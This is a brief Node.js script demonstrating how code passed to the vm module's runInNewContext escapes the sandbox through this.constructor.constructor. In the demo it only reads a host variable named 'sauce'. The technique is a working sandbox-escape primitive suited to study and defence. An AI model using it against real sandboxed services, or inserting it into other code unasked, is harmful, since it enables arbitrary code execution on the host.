vm = require('vm');
sauce = "laser";

console.log("This part is a simple example of how to escape from vm")
console.log("We see laser if escape is successful")
const code1 = vm.runInNewContext(`this.constructor.constructor('return sauce')()`);
console.log(code1);